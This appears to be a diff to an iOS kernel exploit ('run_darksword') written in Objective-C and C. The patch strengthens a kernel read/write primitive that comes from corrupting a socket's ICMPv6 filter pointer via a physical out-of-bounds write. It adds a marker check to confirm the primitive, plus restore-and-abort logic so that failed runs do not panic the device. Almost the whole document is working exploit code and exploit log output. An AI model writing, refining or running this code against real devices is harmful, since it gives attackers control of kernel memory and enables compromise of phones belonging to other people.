@@ -629,6 +629,9 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     printf("[+] PCB B expected rw gencnt: 0x%llx\n",
            [(NSNumber*)socketPcbIds[csi + 1] unsignedLongLongValue]);
 
+    uint64_t origFilt = *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT);
+    uint64_t origFilt8 = *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8);
+
     rwSocketPcb = inpNext;
     memcpy(wBuf, rBuf, OOB_SIZE);
     *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT) = inpNext + OFFSET_ICMP6FILT;
@@ -642,13 +645,62 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     }
 
     int sock = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi] unsignedLongLongValue]);
+    printf("[dbg] control fd=%d\n", sock);
+    fflush(stdout);
+
+    // Positive confirmation of the early-KRW primitive. control's inp_icmp6filt
+    // now points at rw_pcb+0x138, so setsockopt(control) writes 0x20 bytes
+    // directly into the rw inpcb and getsockopt(control) reads them back. The
+    // reference's "*(uint64_t*)gd != -1" check is unreliable here: a fresh
+    // inpcb's icmp6filt region is 0/-1 depending on the kernel, so we use a
+    // known marker instead.
+    uint8_t wmark[0x20]; memset(wmark, 0xff, 0x20);
+    *(uint64_t*)wmark = 0x4141414141414141ULL;
+    setsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, wmark, 0x20);
     uint8_t gd[0x20]; socklen_t sl = 0x20;
-    getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, gd, &sl);
-    if (*(uint64_t*)gd != (uint64_t)-1) {
+    int gso = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, gd, &sl);
+    printf("[dbg] gso=%d gd0=0x%llx want=0x4141414141414141 (filt=0x%llx)\n",
+        gso, *(uint64_t*)gd, *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT));
+    fflush(stdout);
+
+    if (gso == 0 && *(uint64_t*)gd == 0x4141414141414141ULL) {
         controlSocket = sock;
         rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi+1] unsignedLongLongValue]);
+        printf("[+] early KRW confirmed\n");
+        fflush(stdout);
         return 0;
     }
+
+    // PANIC MITIGATION: the corruption landed but the primitive is unusable
+    // (or getsockopt failed). Restore control's inp_icmp6filt to its original
+    // value (0 on fresh inpcbs) so closing this socket cannot kfree() the
+    // poisoned pointer -> "shared.kalloc.192 vs kalloc.type0.1024" zone panic
+    // (observed on-device). If the restore read-back does not match we abort
+    // rather than risk a device panic.
+    printf("[-] KRW check failed (gso=%d gd0=0x%llx), restoring control icmp6filt 0x%llx\n",
+        gso, *(uint64_t*)gd, origFilt);
+    fflush(stdout);
+    uint8_t *rst = malloc(OOB_SIZE);
+    memcpy(rst, rBuf, OOB_SIZE);
+    *(uint64_t*)((uintptr_t)rst + pso + OFFSET_ICMP6FILT) = origFilt;
+    *(uint64_t*)((uintptr_t)rst + pso + OFFSET_ICMP6FILT + 8) = origFilt8;
+    uint64_t backFilt = 0;
+    for (int rtry = 0; rtry < 20; rtry++) {
+        phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rst);
+        phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
+        backFilt = *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT);
+        if (backFilt == origFilt) break;
+    }
+    printf("[-] restore readback: icmp6filt=0x%llx (want 0x%llx)\n", backFilt, origFilt);
+    fflush(stdout);
+    close(sock);
+    free(rst);
+    if (backFilt != origFilt) {
+        printf("[-] RESTORE FAILED - corrupted socket still alive, ABORTING scan\n");
+        fflush(stdout);
+        return -2;
+    }
+    socketCsi = -1;
     return -1;
 }
 
@@ -1552,6 +1604,7 @@ bool run_darksword(void) {
     NSMutableArray *usedGc = [NSMutableArray new];
 
     int attempt = 0;
+    bool abortPoisoned = false;
     mach_timebase_info_data_t timebase;
     mach_timebase_info(&timebase);
     uint64_t attemptStart = mach_absolute_time();
@@ -1613,9 +1666,19 @@ bool run_darksword(void) {
                         describe_window(rBuf, OOB_SIZE, "first-ok");
                         dump_window(rBuf, OOB_SIZE, "win");
                     }
-                    if (find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false) == 0) {
+                    int fcs = find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false);
+                    if (fcs == 0) {
                         ok = true;
                         break;
+                    }
+                    if (fcs == -2) {
+                        // RESTORE FAILED: the corrupted socket is still poisoned.
+                        // Releasing it would panic the device, so abort the whole
+                        // run WITHOUT releasing sockets (socketCsi still set).
+                        printf("[-] ABORT: restore of corrupted socket failed\n");
+                        fflush(stdout);
+                        abortPoisoned = true;
+                        goto abort_no_release;
                     }
                 }
                 pagesDone++;
@@ -1644,7 +1707,8 @@ bool run_darksword(void) {
         // kfree()s their poisoned inp_icmp6filt -> kalloc.32 zone panic). On
         // success the sockets backing controlSocket/rwSocket (and PCB B) stay
         // alive so the inpcb memory is not recycled as MAC labels.
-        if (!ok) {
+abort_no_release:
+        if (!ok && !abortPoisoned) {
             sockets_release_except_pair();
         }
         for (uint64_t s = 0; s < mappingNum; s++) {
@@ -1653,7 +1717,7 @@ bool run_darksword(void) {
             [mappings removeLastObject];
         }
 
-        if (ok) break;
+        if (ok || abortPoisoned) break;
         uint64_t now = mach_absolute_time();
         double elapsed = (double)(now - attemptStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
         printf("[exploit] attempt %d: no socket found, retrying (took %.1fs)\n", attempt, elapsed);
